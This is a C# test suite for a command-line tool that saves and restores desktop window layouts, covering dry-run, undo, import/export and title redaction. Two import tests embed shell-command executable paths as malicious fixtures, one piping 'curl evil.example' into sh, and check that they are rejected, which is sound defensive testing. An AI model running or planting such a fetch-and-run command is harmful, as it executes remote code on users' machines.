using System.Collections.Immutable;
using System.Text.Json;
using WindowRecall.Cli;
using WindowRecall.Core;
using WindowRecall.Core.Tests;

namespace WindowRecall.Cli.Tests;

/// <summary>End-to-end command tests with an injected fake desktop: exit codes, stable JSON,
/// dry-run default, ambiguity refusal, undo round trip, import/export, and privacy behavior.</summary>
public sealed class CliRunnerTests : IDisposable
{
    private static readonly DisplaySnapshot MainDisplay = new(
        "display-1", "Main", new DesktopRect(0, 0, 1920, 1080), new DesktopRect(0, 0, 1920, 1040),
        1, DisplayOrientation.Landscape, true);

    private readonly string root = Path.Combine(Path.GetTempPath(), "WindowRecall.Cli.Tests", Guid.NewGuid().ToString("N"));

    [Fact]
    public async Task NoArguments_ShowsUsageWithValidationExit()
    {
        StringWriter stdout = new();
        CliRunner runner = new(stdout, new StringWriter(), () => new UnsupportedDesktopAdapter());
        int exit = await runner.RunAsync([]);
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("usage: window-recall", stdout.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public async Task UnknownCommand_IsValidationError()
    {
        (int exit, string _, string stderr) = await RunAsync("teleport");
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("Unknown command", stderr, StringComparison.Ordinal);
    }

    [Fact]
    public async Task VersionCommand_ReportsAssemblyProductVersion()
    {
        StringWriter stdout = new();
        CliRunner runner = new(stdout, new StringWriter(), () => new UnsupportedDesktopAdapter());

        int exit = await runner.RunAsync(["--version"]);

        Assert.Equal(CliRunner.ExitSuccess, exit);
        Assert.Equal($"window-recall cli {CliRunner.ProductVersion}{Environment.NewLine}", stdout.ToString());
        Assert.Matches(@"^\d+\.\d+\.\d+$", CliRunner.ProductVersion);
    }

    [Fact]
    public async Task ProfilesList_EmptyStorage_IsSuccess()
    {
        (int exit, string stdout, _) = await RunAsync("profiles", "list", "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        AssertJson(stdout, "status", "success");
        Assert.Empty(ReadJson(stdout).GetProperty("data").GetProperty("profiles").EnumerateArray());
    }

    [Fact]
    public async Task Capture_PersistsProfileWithoutTitlesByDefault()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", "Private plan 42", new DesktopRect(100, 100, 800, 600))));
        (int exit, string stdout, _) = await RunAsync(system, "capture", "--name", "Desk", "--json");

        Assert.Equal(CliRunner.ExitSuccess, exit);
        AssertJson(stdout, "status", "success");
        string stored = await File.ReadAllTextAsync(Path.Combine(root, "profiles", "desk.json"));
        Assert.DoesNotContain("Private plan 42", stored, StringComparison.Ordinal);
        Assert.Contains("\"persistWindowTitles\": false", stored, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Capture_WithPersistTitlesAndRedaction_StoresRedactedTitlesOnly()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", "Invoice 1234 final", new DesktopRect(100, 100, 800, 600))));
        (int exit, _, _) = await RunAsync(system,
            "capture", "--name", "Desk", "--persist-titles", "--redact", "\\d+", "--json");

        Assert.Equal(CliRunner.ExitSuccess, exit);
        string stored = await File.ReadAllTextAsync(Path.Combine(root, "profiles", "desk.json"));
        Assert.Contains("[redacted]", stored, StringComparison.Ordinal);
        Assert.DoesNotContain("1234", stored, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Capture_RedactWithoutPersistTitles_IsValidationError()
    {
        InMemoryWindowSystem system = new(Desktop());
        (int exit, string _, string stderr) = await RunAsync(system,
            "capture", "--name", "Desk", "--redact", "secret");
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("--persist-titles", stderr, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Capture_ConflictingProfileId_RequiresForce()
    {
        InMemoryWindowSystem system = new(Desktop());
        Assert.Equal(CliRunner.ExitSuccess, (await RunAsync(system, "capture", "--name", "Desk")).exit);

        (int conflict, string stdout, _) = await RunAsync(system, "capture", "--name", "Desk", "--json");
        Assert.Equal(CliRunner.ExitConflict, conflict);
        AssertJson(stdout, "status", "conflict");
        // The existing profile is untouched by the refused capture.
        Assert.Contains("\"name\": \"Desk\"", await File.ReadAllTextAsync(Path.Combine(root, "profiles", "desk.json")), StringComparison.Ordinal);

        (int forced, string _, _) = await RunAsync(system, "capture", "--name", "Desk", "--force");
        Assert.Equal(CliRunner.ExitSuccess, forced);
    }

    [Fact]
    public async Task Capture_OnUnsupportedPlatform_IsPermissionMissing()
    {
        UnsupportedDesktopAdapter system = new();
        (int exit, string stdout, _) = await RunAsync(system, "capture", "--name", "Desk", "--json");
        Assert.Equal(CliRunner.ExitPermissionMissing, exit);
        AssertJson(stdout, "status", "permissionMissing");
    }

    [Fact]
    public async Task Plan_IsDeterministicNonMutatingWithStableJsonShape()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(0, 640, 960, 400))));
        SeedProfile(system,
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(0, 640, 960, 400)));

        (int first, string firstStdout, _) = await RunAsync(system, "plan", "desk", "--json");
        (int second, string secondStdout, _) = await RunAsync(system, "plan", "desk", "--json");

        Assert.Equal(CliRunner.ExitSuccess, first);
        Assert.Equal(CliRunner.ExitSuccess, second);
        // planId is a per-run GUID; the remaining document must be byte-identical.
        Assert.Equal(NormalizeVolatile(firstStdout), NormalizeVolatile(secondStdout));
        AssertJson(firstStdout, "status", "planned");
        Assert.Equal(0, system.ApplyCalls); // planning must never mutate.
        JsonElement items = ReadJson(firstStdout).GetProperty("data").GetProperty("items");
        Assert.Equal(2, items.GetArrayLength());
        Assert.All(items.EnumerateArray(), item => Assert.Equal("moveResize", item.GetProperty("action").GetString()));
    }

    [Fact]
    public async Task Plan_NothingApplicable_IsNoMatch()
    {
        InMemoryWindowSystem system = new(Desktop());
        SeedProfile(system); // Profile references w1; nothing is currently open; launch policy is never.
        (int exit, string stdout, _) = await RunAsync(system, "plan", "desk", "--json");
        Assert.Equal(CliRunner.ExitNoMatch, exit);
        AssertJson(stdout, "status", "noMatch");
    }

    [Fact]
    public async Task Apply_WithoutExecute_IsDryRunAndNeverMutates()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600))));
        SeedProfile(system);

        (int exit, string stdout, _) = await RunAsync(system, "apply", "desk", "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        AssertJson(stdout, "status", "planned");
        Assert.Equal(0, system.ApplyCalls);
        Assert.False(File.Exists(CliPaths.UndoReceiptPath(root)));
    }

    [Fact]
    public async Task Apply_ExecuteThenUndo_RestoresPositionsAndArchivesReceipt()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600))));
        SeedProfile(system); // Saved target for w1 is (100,100).

        (int applied, string applyStdout, _) = await RunAsync(system, "apply", "desk", "--execute", "--json");
        Assert.Equal(CliRunner.ExitSuccess, applied);
        AssertJson(applyStdout, "status", "success");
        Assert.Equal(100, CurrentWindow(system, "w1").NormalBounds.X);
        Assert.True(File.Exists(CliPaths.UndoReceiptPath(root)));
        // The persisted receipt never stores raw window titles.
        Assert.DoesNotContain("\"title\"", await File.ReadAllTextAsync(CliPaths.UndoReceiptPath(root)), StringComparison.Ordinal);

        (int undid, string undoStdout, _) = await RunAsync(system, "undo", "--json");
        Assert.Equal(CliRunner.ExitSuccess, undid);
        AssertJson(undoStdout, "status", "success");
        Assert.Equal(0, CurrentWindow(system, "w1").NormalBounds.X);
        Assert.False(File.Exists(CliPaths.UndoReceiptPath(root)));
        Assert.Single(Directory.GetFiles(Path.Combine(root, "undo"), "consumed-*.json"));

        (int again, string _, string _) = await RunAsync(system, "undo", "--json");
        Assert.Equal(CliRunner.ExitValidation, again);
    }

    [Fact]
    public async Task Apply_ExecuteWithOneFailingWindow_IsPartialAndKeepsUndo()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(0, 640, 960, 400))));
        system.OutcomeOverride = item => item.CurrentWindowId == "w2"
            ? new WindowOutcome(item.SavedWindowId, "w2", WindowOutcomeCode.Failed, "The app rejected the move.")
            : null!;
        SeedProfile(system,
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(10, 650, 960, 400)));

        (int exit, string stdout, _) = await RunAsync(system, "apply", "desk", "--execute", "--json");
        Assert.Equal(CliRunner.ExitPartial, exit);
        AssertJson(stdout, "status", "partial");
        Assert.True(File.Exists(CliPaths.UndoReceiptPath(root)));
    }

    [Fact]
    public async Task AmbiguousWindow_IsNeverAppliedAndCannotBeSelected()
    {
        // Two current windows share the exact application+executable identity of one saved window.
        InMemoryWindowSystem system = new(Desktop(
            Window("c1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600)),
            Window("c2", "com.example.editor", null, new DesktopRect(960, 0, 800, 600))));
        SeedProfile(system, Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600)));

        (int planExit, string planStdout, _) = await RunAsync(system, "plan", "desk", "--json");
        Assert.Equal(CliRunner.ExitNoMatch, planExit);
        JsonElement item = ReadJson(planStdout).GetProperty("data").GetProperty("items")[0];
        Assert.Equal("ambiguous", item.GetProperty("action").GetString());
        Assert.False(item.GetProperty("isIncluded").GetBoolean());

        (int selectExit, string selectStdout, _) = await RunAsync(system,
            "apply", "desk", "--execute", "--select", "w1", "--json");
        Assert.Equal(CliRunner.ExitValidation, selectExit);
        Assert.Contains("ambiguous", selectStdout, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(0, system.ApplyCalls);
    }

    [Fact]
    public async Task Apply_ExecuteOnCapabilitylessAdapter_IsPermissionMissing()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600))),
            new WindowSystemCapabilities(true, false, false, false, "macOS Accessibility permission is not granted."));
        SeedProfile(system);

        (int exit, string stdout, _) = await RunAsync(system, "apply", "desk", "--execute", "--json");
        Assert.Equal(CliRunner.ExitPermissionMissing, exit);
        AssertJson(stdout, "status", "permissionMissing");
    }

    [Fact]
    public async Task ExportImport_RoundTripsAndNeverSilentlyOverwrites()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600))));
        SeedProfile(system);
        string exportPath = Path.Combine(root, "desk-export.json");

        (int exported, string _, _) = await RunAsync(system, "export", "desk", "--out", exportPath);
        Assert.Equal(CliRunner.ExitSuccess, exported);
        Assert.True(File.Exists(exportPath));

        // Export refuses to overwrite without --force.
        (int conflict, string conflictStdout, _) = await RunAsync(system, "export", "desk", "--out", exportPath, "--json");
        Assert.Equal(CliRunner.ExitConflict, conflict);
        Assert.Contains("already exists", conflictStdout, StringComparison.Ordinal);

        // Delete the stored profile, then import the exported document back under the same id.
        await new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).DeleteAsync("desk");

        (int imported, string importStdout, _) = await RunAsync(system, "import", exportPath, "--profile-id", "desk", "--json");
        Assert.Equal(CliRunner.ExitSuccess, imported);
        AssertJson(importStdout, "status", "success");
        LayoutProfile reloaded = await new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).LoadAsync("desk");
        Assert.Equal("Desk", reloaded.Name);
        Assert.Equal(new DesktopRect(100, 100, 800, 600), reloaded.Windows[0].NormalBounds);

        // Import conflict behavior: default fail, rename derives the suffix from the target id.
        (int fail, string _, string _) = await RunAsync(system, "import", exportPath, "--profile-id", "desk", "--json");
        Assert.Equal(CliRunner.ExitConflict, fail);
        (int renamed, string renameStdout, _) = await RunAsync(system, "import", exportPath, "--profile-id", "desk", "--on-conflict", "rename", "--json");
        Assert.Equal(CliRunner.ExitSuccess, renamed);
        Assert.Equal("desk-2", ReadJson(renameStdout).GetProperty("data").GetProperty("profileId").GetString());
        (int overwrite, string _, _) = await RunAsync(system, "import", exportPath, "--profile-id", "desk", "--on-conflict", "overwrite", "--json");
        Assert.Equal(CliRunner.ExitSuccess, overwrite);
    }

    [Fact]
    public async Task Import_DerivesProfileIdFromFileNameWhenNotGiven()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600))));
        SeedProfile(system);
        string exportPath = Path.Combine(root, "backup-desk.json");
        Assert.Equal(CliRunner.ExitSuccess, (await RunAsync(system, "export", "desk", "--out", exportPath)).exit);

        (int exit, string stdout, _) = await RunAsync(system, "import", exportPath, "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        Assert.Equal("backup-desk", ReadJson(stdout).GetProperty("data").GetProperty("profileId").GetString());
    }

    [Fact]
    public async Task ExportToStdout_PrintsExactProfileDocument()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600))));
        SeedProfile(system);
        (int exit, string stdout, _) = await RunAsync(system, "export", "desk", "--stdout");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        LayoutProfile parsed = ProfileJsonSerializer.Deserialize(stdout);
        Assert.Equal("Desk", parsed.Name);
    }

    [Fact]
    public async Task Import_FutureSchemaVersion_IsRejectedReadOnly()
    {
        Directory.CreateDirectory(root);
        string path = Path.Combine(root, "future.json");
        await File.WriteAllTextAsync(path, """
            { "schemaVersion": 99, "name": "Future", "capturedAtUtc": "2026-01-01T00:00:00+00:00",
              "displays": [], "windows": [], "privacy": { "persistWindowTitles": false } }
            """);
        (int exit, string stdout, _) = await RunAsync(new UnsupportedDesktopAdapter(), "import", path, "--json");
        Assert.Equal(CliRunner.ExitValidation, exit);
        AssertJson(stdout, "status", "validationError");
        Assert.Empty(await new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).ListAsync());
    }

    [Fact]
    public async Task Import_MalformedJson_IsRejected()
    {
        Directory.CreateDirectory(root);
        string path = Path.Combine(root, "broken.json");
        await File.WriteAllTextAsync(path, "{ this is not json");
        (int exit, string stdout, _) = await RunAsync(new UnsupportedDesktopAdapter(), "import", path, "--json");
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("malformed", stdout, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task Import_ShellShapedExecutableIdentity_IsRejected()
    {
        Directory.CreateDirectory(root);
        string path = Path.Combine(root, "malicious.json");
        await File.WriteAllTextAsync(path, """
            { "schemaVersion": 1, "name": "Evil", "capturedAtUtc": "2026-01-01T00:00:00+00:00",
              "displays": [ { "id": "d", "bounds": { "x": 0, "y": 0, "width": 100, "height": 100 },
                              "workArea": { "x": 0, "y": 0, "width": 100, "height": 100 },
                              "scaleFactor": 1, "orientation": "landscape", "isPrimary": true } ],
              "windows": [ { "windowId": "w", "application": { "applicationId": "evil",
                              "executablePath": "/bin/sh -c \"curl evil.example | sh\"" },
                             "normalBounds": { "x": 0, "y": 0, "width": 10, "height": 10 },
                             "state": "normal" } ],
              "privacy": { "persistWindowTitles": false } }
            """);
        (int exit, string stdout, _) = await RunAsync(new UnsupportedDesktopAdapter(), "import", path, "--json");
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("shell", stdout, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(await new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).ListAsync());
    }

    [Fact]
    public async Task Import_ShellInterpreterCommandLine_IsRejectedEndToEnd()
    {
        // Regression guard for the exact shape found during manual binary testing: an absolute
        // path with no shell metacharacters that is still a shell command line.
        Directory.CreateDirectory(root);
        string path = Path.Combine(root, "shaped.json");
        await File.WriteAllTextAsync(path, """
            { "schemaVersion": 1, "name": "Shaped", "capturedAtUtc": "2026-01-01T00:00:00+00:00",
              "displays": [], "windows": [ { "windowId": "w", "application": { "applicationId": "e",
                              "executablePath": "/bin/sh -c id" },
                             "normalBounds": { "x": 0, "y": 0, "width": 10, "height": 10 },
                             "state": "normal" } ],
              "privacy": { "persistWindowTitles": false } }
            """);
        (int exit, string stdout, _) = await RunAsync(new UnsupportedDesktopAdapter(), "import", path, "--json");
        Assert.Equal(CliRunner.ExitValidation, exit);
        Assert.Contains("shell interpreter", stdout, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(await new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).ListAsync());
    }

    [Fact]
    public async Task Doctor_HealthyStorage_ReportsNoNetworkBaseline()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600))));
        SeedProfile(system);
        (int exit, string stdout, _) = await RunAsync(system, "doctor", "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        JsonElement privacy = ReadJson(stdout).GetProperty("data").GetProperty("privacy");
        Assert.Equal("none", privacy.GetProperty("networkUsage").GetString());
        Assert.Equal("opt-in per profile", privacy.GetProperty("titleStorage").GetString());
    }

    [Fact]
    public async Task Doctor_CorruptProfileAndReceipt_ReportsIssues()
    {
        Directory.CreateDirectory(CliPaths.ProfilesDirectory(root));
        await File.WriteAllTextAsync(Path.Combine(CliPaths.ProfilesDirectory(root), "corrupt.json"), "{ nope");
        Directory.CreateDirectory(Path.GetDirectoryName(CliPaths.UndoReceiptPath(root))!);
        await File.WriteAllTextAsync(CliPaths.UndoReceiptPath(root), "{ broken");

        (int exit, string stdout, _) = await RunAsync(new UnsupportedDesktopAdapter(), "doctor", "--json");
        Assert.Equal(CliRunner.ExitValidation, exit);
        JsonElement issues = ReadJson(stdout).GetProperty("data").GetProperty("issues");
        Assert.Equal(2, issues.GetArrayLength());
    }

    [Fact]
    public async Task ProfilesInspect_ReportsExactlyWhatIsStored()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", "Secret 7", new DesktopRect(100, 100, 800, 600))));
        await RunAsync(system, "capture", "--name", "Desk", "--persist-titles", "--redact", "Secret");

        (int exit, string stdout, _) = await RunAsync(system, "profiles", "inspect", "desk", "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        JsonElement data = ReadJson(stdout).GetProperty("data");
        Assert.True(data.GetProperty("valid").GetBoolean());
        Assert.Equal(1, data.GetProperty("storedTitleCount").GetInt32());
        Assert.Equal(1, data.GetProperty("windowCount").GetInt32());
        Assert.Empty(data.GetProperty("unsafeExecutableIdentities").EnumerateArray());
        // The report never echoes the stored title itself.
        Assert.DoesNotContain("Secret", stdout, StringComparison.Ordinal);
        Assert.Contains("[redacted]", await File.ReadAllTextAsync(Path.Combine(root, "profiles", "desk.json")), StringComparison.Ordinal);
    }

    [Fact]
    public async Task Select_MatchesDeterministicItemAndAppliesOnlyThatWindow()
    {
        InMemoryWindowSystem system = new(Desktop(
            Window("w1", "com.example.editor", null, new DesktopRect(0, 0, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(0, 640, 960, 400))));
        SeedProfile(system,
            Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600)),
            Window("w2", "com.example.terminal", null, new DesktopRect(10, 650, 960, 400)));

        (int exit, string stdout, _) = await RunAsync(system, "apply", "desk", "--execute", "--select", "w1", "--json");
        Assert.Equal(CliRunner.ExitSuccess, exit);
        Assert.Equal(100, CurrentWindow(system, "w1").NormalBounds.X);
        Assert.Equal(0, CurrentWindow(system, "w2").NormalBounds.X); // untouched
        Assert.Contains("skipped", stdout, StringComparison.Ordinal);
    }

    public void Dispose()
    {
        try { Directory.Delete(root, recursive: true); } catch (IOException) { }
    }

    private void SeedProfile(InMemoryWindowSystem system, params WindowSnapshot[] savedWindows) =>
        SeedProfileAsync(savedWindows.Length == 0
            ? [Window("w1", "com.example.editor", null, new DesktopRect(100, 100, 800, 600))]
            : savedWindows).GetAwaiter().GetResult();

    private Task SeedProfileAsync(params WindowSnapshot[] savedWindows)
    {
        LayoutProfile profile = new(
            LayoutProfile.CurrentSchemaVersion, "Desk",
            new DateTimeOffset(2026, 1, 2, 3, 4, 5, TimeSpan.Zero),
            [MainDisplay], savedWindows.ToImmutableArray(), new ProfilePrivacy(false));
        return new JsonFileProfileStore(CliPaths.ProfilesDirectory(root)).SaveAsync("desk", profile);
    }

    private static WindowSnapshot Window(string id, string appId, string? title, DesktopRect bounds) =>
        new(id, new ApplicationIdentity(appId, "/Applications/Editor"), "main", title, bounds, WindowState.Normal, "display-1");

    private static CurrentDesktop Desktop(params WindowSnapshot[] windows) =>
        new(new DateTimeOffset(2026, 2, 3, 4, 5, 6, TimeSpan.Zero), [MainDisplay], windows.ToImmutableArray());

    private static WindowSnapshot CurrentWindow(InMemoryWindowSystem system, string id) =>
        system.CaptureAsync().GetAwaiter().GetResult().Windows.Single(window => window.WindowId == id);

    private async Task<(int exit, string stdout, string stderr)> RunAsync(params string[] args) =>
        await RunAsync(new UnsupportedDesktopAdapter(), args);

    private async Task<(int exit, string stdout, string stderr)> RunAsync(IWindowSystem system, params string[] args)
    {
        StringWriter stdout = new();
        StringWriter stderr = new();
        CliRunner runner = new(stdout, stderr, () => system);
        int exit = await runner.RunAsync(args.Append("--data-root").Append(root).ToArray());
        return (exit, stdout.ToString(), stderr.ToString());
    }

    private static JsonElement ReadJson(string json)
    {
        int start = json.IndexOf('{', StringComparison.Ordinal);
        Assert.True(start >= 0, $"Expected JSON in output: {json}");
        return JsonDocument.Parse(json[start..]).RootElement;
    }

    private static void AssertJson(string json, string property, string expected)
    {
        JsonElement root = ReadJson(json);
        Assert.True(root.TryGetProperty(property, out JsonElement value), $"'{property}' missing in {json}");
        Assert.Equal(expected, value.ValueKind == JsonValueKind.String ? value.GetString() : value.ToString());
    }

    private static string NormalizeVolatile(string json) =>
        System.Text.RegularExpressions.Regex.Replace(json, "\"planId\": \"[0-9a-f-]+\"", "\"planId\": \"stable\"");
}
